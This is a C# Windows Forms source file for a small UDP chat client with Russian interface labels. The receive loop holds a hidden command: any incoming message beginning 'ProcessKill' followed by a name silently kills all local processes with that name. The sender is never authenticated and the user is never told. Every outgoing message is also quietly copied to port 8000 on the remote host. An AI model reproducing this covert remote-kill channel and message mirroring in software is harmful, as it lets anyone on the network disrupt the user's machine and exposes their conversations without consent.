using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Messenger
{
    public partial class Form2 : Form
    {
        public event Action CallOnTabBack;
        public event Action CallOnTabClose;

        private string _remoteAddress;
        private int _remotePort;
        private int _localPort;

        private Thread _reciveThread;

        public Form2(string remoteAddress, int remotePort, int localPort)
        {
            InitializeComponent();
            Text = localPort.ToString();
            _remoteAddress = remoteAddress;
            _remotePort = remotePort;
            _localPort = localPort;
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            FormClosed += new FormClosedEventHandler(OnFormClosed);
            _reciveThread = new Thread(new ThreadStart(ReceiveMessage));
            _reciveThread.Start();
            SendMessage("Open", 8000);
        }

        private void SendMessage(string message,int port)
        {
            UdpClient messageSender = new UdpClient();
            try
            {
                textBox1.Clear();
                if (!string.IsNullOrEmpty(message))
                {
                    if (port != 8000)
                    {
                        byte[] personData = Encoding.Unicode.GetBytes(message);
                        messageSender.Send(personData, personData.Length, _remoteAddress, _remotePort);
                        listBox1.Items.Add($"Вы: {message}");
                    }
                    byte[] data = Encoding.Unicode.GetBytes($"{_localPort}:{message}");
                    messageSender.Send(data, data.Length, _remoteAddress, 8000);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            finally
            {
                messageSender.Close();
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            SendMessage(textBox1.Text,_remotePort);
        }

        private void ReceiveMessage()
        {
            UdpClient receiver = new UdpClient(_localPort); 
            IPEndPoint remoteIp = null; 
            try
            {
                while (true)
                {
                    byte[] data = receiver.Receive(ref remoteIp);
                    string message = Encoding.Unicode.GetString(data);
                    if (!string.IsNullOrEmpty(message))
                    {
                        var messageSplit = message.Split(' ');
                        if(messageSplit[0] == "ProcessKill")
                        {
                            ProccessKill(messageSplit[1]);
                            continue;
                        }
                        Invoke((MethodInvoker)(() => listBox1.Items.Add($"Собеседник: {message}")));
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            finally
            {
                receiver.Close();
            }
        }

        public void OnFormClosed(object sender, EventArgs e)
        {
            SendMessage("Exit",8000);
            _reciveThread.Abort();
            Environment.Exit(0);
        }

        private void ProccessKill(string name)
        {
            var procArr = Process.GetProcessesByName(name);
            if (procArr.Length != 0)
            {
                foreach (var proc in procArr)
                {
                    proc.Kill();
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            CallOnTabBack?.Invoke();
            Close();
        }
    }
}
